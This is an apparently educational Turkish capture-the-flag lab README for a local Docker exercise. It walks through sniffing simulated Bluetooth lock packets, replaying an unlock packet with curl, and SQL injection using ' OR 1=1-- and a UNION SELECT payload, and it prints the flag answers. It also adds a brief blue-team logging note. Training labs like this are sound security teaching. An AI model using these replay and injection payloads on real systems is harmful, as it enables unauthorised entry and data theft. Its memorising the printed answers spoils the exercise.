# 🚪 LAB 4: Fiziksel İllüzyon — Akıllı Kilit Replay Saldırısı

> **Zorluk:** ⭐⭐ Kolay-Orta  
> **Süre:** ~30 dakika  
> **Portlar:** 8084 (Web Config), 9001 (Simüle BLE GATT)

---

## 📖 Hikaye

Artık anahtarın yok. Telefonundan bir dokunuşla kapı açılıyor. Teknoloji seni özgür kıldı. Ya da öyle düşünüyordun. Kilidi açan sinyali bir kez yakalayan biri, onu sonsuza kadar tekrarlayabilir.

---

## 🚀 Başlatma

```bash
cd lab4-lock
docker build -t lab4-lock .
docker run -d --name lab4-lock -p 8084:8084 -p 9001:9001 lab4-lock
```

Tarayıcıda aç: **http://localhost:8084**

---

## 🔍 Çözüm Adımları

### FLAG 1 — BLE Paket Dinleme

**Konsept:** Bluetooth Low Energy paketleri şifrelenmemiş havada uçuyor. Yakındaki herkes dinleyebilir.

1. **BLE Cihazları Tara** butonuna bas
2. Dönen pakette `encryption: false` yazar
3. Paketler base64 ile "şifrelenmiş" gibi görünür ama bu şifreleme değil, sadece kodlama

```bash
curl "http://localhost:8084/api/ble/scan"
# Simüle BLE bağlantısı:
nc localhost 9001
```

```
FLAG{bl3_gatt_sn1ff_0p3n_s3sam3}
```

---

### FLAG 2 — Replay Attack (Tekrar Oynatma Saldırısı)

**Konsept:** Kilit, paketi gönderenin kimliğini doğrulamıyor. Geçerli bir paketi tekrar göndermek yeterli.

1. Önce BLE taraması yap (FLAG 1) — paket yakalanır
2. "Yakalanan Paketi Oynat" butonuna bas
3. Kilit açılır!

```bash
# Manuel replay:
curl -X POST http://localhost:8084/api/lock/unlock \
  -H "Content-Type: application/json" \
  -d '{"packet": "VU5MT0NLOmhvbWU6MTIzNA=="}'
```

```
FLAG{r3play_att4ck_byp4ss_l0ck}
```

**Gerçek dünyada:** Garaj kapısı kumandaları, eski araba kilitleri ve bazı akıllı kilitler bu saldırıya karşı savunmasızdır.

---

### FLAG 3 — SQL Injection

**Konsept:** Kullanıcı arama sorgusu, girdi temizleme yapmıyor.

1. Kullanıcı arama alanına şunu yaz:

```
' OR 1=1--
```

Bu sorgu tüm kullanıcıları getirir. Admin kullanıcısının `flag` alanında FLAG3 bulunur.

```bash
curl "http://localhost:8084/api/users/lookup?username=' OR 1=1--"
```

UNION ile de denenebilir:
```
admin' UNION SELECT 1,username,role,flag FROM users--
```

```
FLAG{sql1_1nj3ct10n_unl0cks_db}
```

---

## 🔵 Blue Team Notu

```bash
docker logs -f lab4-lock
```

- `BLE GATT CONNECTION` → Kim bağlandı
- `REPLAY ATTACK SUCCESS` → Hangi paket kullanıldı
- `SQL QUERY:` → Injection payload'ı tam olarak loglanır

---

*Sonraki Lab → [LAB 5: Sahte Güven - Evil Twin](../lab5-evil-twin/README.md)*
